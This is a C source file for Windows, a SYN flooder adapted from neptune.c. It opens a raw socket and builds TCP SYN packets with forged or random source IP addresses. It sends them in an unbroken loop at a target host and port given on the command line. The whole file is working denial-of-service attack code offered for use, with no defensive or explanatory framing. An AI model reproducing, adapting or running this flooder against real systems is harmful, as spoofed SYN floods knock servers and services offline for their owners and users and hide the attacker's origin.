/* Syn Flooder -- hacked on from neptune.c */
/* cl -nologo synflood.c -MD -W3 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <time.h>

#include <winsock2.h>
#include <ws2tcpip.h>
#include "RAWtcpip.h"
#pragma comment (lib, "ws2_32.lib")

#define SEQ 0x28376839
#define getrandom(min, max) ((rand() % (int)(((max)+1) - (min))) + (min))

unsigned long send_seq, ack_seq;
u_short srcport = 5150;
char flood = 0;
int ssock, curc, cnt;
int interrupt = 0;


BOOL WINAPI HandlerRoutine(DWORD dwCtrlType);

unsigned long
getaddr(char *name)
{
    struct hostent *hep;
    
    hep=gethostbyname(name);
    if(!hep) {
	fprintf(stderr, "Unknown host %s\n", name);
	exit(1);
    }
    return *(unsigned long *)hep->h_addr;
}


void
send_tcp_segment (struct iphdr *ih, struct tcphdr *th, char *data, int dlen)
{
    char buf[65536];
    struct {  /* rfc 793 tcp pseudo-header */
	unsigned long saddr, daddr;
	char mbz;
	char ptcl;
	unsigned short tcpl;
    } ph;
    
    struct sockaddr_in sin;	/* how necessary is this, given that the destination
			     address is already in the ip header? */

#define HDR_LEN (sizeof(__int32) * (ih->ip_hl))
    
    ph.saddr= ih->ip_src.s_addr;
    ph.daddr= ih->ip_dst.s_addr;
    ph.mbz=0;
    ph.ptcl=IPPROTO_TCP;
    ph.tcpl=htons((u_short)(TCP_HDR_LEN + dlen));
    
    memcpy(buf, &ph, sizeof(ph));
    memcpy(buf+sizeof(ph), th, TCP_HDR_LEN);
    memcpy(buf+sizeof(ph)+TCP_HDR_LEN, data, dlen);
    memset(buf+sizeof(ph)+TCP_HDR_LEN+dlen, 0, 4);
    th->th_chksum=in_cksum((u_short *)buf, (sizeof(ph)+TCP_HDR_LEN+dlen+1)&~1);
    
    memcpy(buf, ih, HDR_LEN);
    memcpy(buf+HDR_LEN, th, TCP_HDR_LEN);
    memcpy(buf+HDR_LEN+TCP_HDR_LEN, data, dlen);
    memset(buf+HDR_LEN+TCP_HDR_LEN+dlen, 0, 4);  // padding.
    
    ih->ip_chksum=in_cksum((u_short *)buf, (HDR_LEN + TCP_HDR_LEN + dlen + 1) & ~1);
    memcpy(buf, ih, HDR_LEN);
    
    sin.sin_family=AF_INET;
    sin.sin_port=th->th_dport;
    sin.sin_addr=ih->ip_dst;
    
    if(sendto(ssock, buf, HDR_LEN + TCP_HDR_LEN + dlen, 0, (struct sockaddr *)&sin, sizeof(sin)) == SOCKET_ERROR) {
	printf("Error sending syn packet.\n"); perror("");
	interrupt = 1;
    }
#undef HDR_LEN
}

void
spoof_open(unsigned long my_ip, unsigned long their_ip, unsigned short port)
{
    struct iphdr ih;
    struct tcphdr th;
    struct tcpopt_mss mss;
    unsigned short myport=6969;
    char buf[1024];
    
    ih.ip_v=IPVERSION;
    ih.ip_hl=IP_HDR_LEN/sizeof(__int32);
    ih.ip_tos=0;			/* XXX is this normal? */
    ih.ip_len=IP_HDR_LEN+TCP_HDR_LEN;
    ih.ip_id=htons((u_short)rand());
    ih.ip_frg=0;
    ih.ip_df = 1;  // don't frag.
    ih.ip_ttl=64;
    ih.ip_p=IPPROTO_TCP;
    ih.ip_chksum=0;  // for now..
    ih.ip_src.s_addr=my_ip;
    ih.ip_dst.s_addr=their_ip;
    
    th.th_sport=htons(srcport);
    th.th_dport=htons(port);
    th.th_seqnum=htonl(SEQ);
    th.th_acknum=0;
    th.th_doff=TCP_HDR_LEN+3;
    th.th_x2 = 0;
    th.th_flags=0;
    th.th_syn = 1;  // this is a SYN.
    th.th_win=htons(64240);
    th.th_chksum=0;  // for now..
    th.th_urp=0;

    mss.kind = 2;
    mss.len = 4;
    mss.mss = htons(1460);
    mss.pad1 = 0x02040101;  // nop, nop, sack permitted
    
    send_tcp_segment(&ih, &th, (char *)&mss, sizeof(struct tcpopt_mss)); 
    send_seq = SEQ+1+strlen(buf);
}

int
main (int argc, char **argv)
{
    int urip, a, b, c, d, result;
    unsigned long them, me_fake;
    u_short dstport;
    char junk[16];
    WSADATA data;
    BOOL boolean;
    char *optval = (char *)&boolean;
    int optlen;

    if (argc<4) {
	printf("Usage: %s srcaddr dstaddr dstport\n", argv[0]);
	printf("    If srcaddr is -1, random addresses will be used\n\n\n");
	exit(1);
    }

    WSAStartup(WINSOCK_VERSION, &data);
    SetConsoleCtrlHandler(HandlerRoutine, TRUE);

    if (atoi(argv[1]) == -1) {
	urip = 1;
    } else {
	me_fake=getaddr(argv[1]);
    }
    them=getaddr(argv[2]);
    dstport=atoi(argv[3]);
    srand(time(0));
    ssock=socket(AF_INET, SOCK_RAW, IPPROTO_IP);
    if(ssock == INVALID_SOCKET) {
	perror("socket (raw)");
	exit(1);
    }
    optlen = sizeof(BOOL);
    boolean = TRUE;
    result = setsockopt(ssock, IPPROTO_IP, IP_HDRINCL, optval, optlen);
    if (result == SOCKET_ERROR) {
	perror("setsockopt");
	exit(1);
    }
   
again:
    srcport = getrandom(0, 6000)+1024;
    if (urip == 1) {
       a = getrandom(4, 252);
       b = getrandom(0, 255);
       c = getrandom(0, 255);
       d = getrandom(1, 254);
       wsprintf(junk, "%d.%d.%d.%d", a, b, c, d);
       me_fake = getaddr(junk);
    }

    spoof_open(me_fake, them, dstport);

    if (interrupt) {
	puts("\nExiting\n");
	goto end;
    }

    //Sleep(80);
    printf("."); fflush(stdout);
    goto again;

end:
    closesocket(ssock);
    WSACleanup();
    return 0;
}

BOOL WINAPI
HandlerRoutine (DWORD dwCtrlType)
{
    interrupt = 1;
    return TRUE;
}
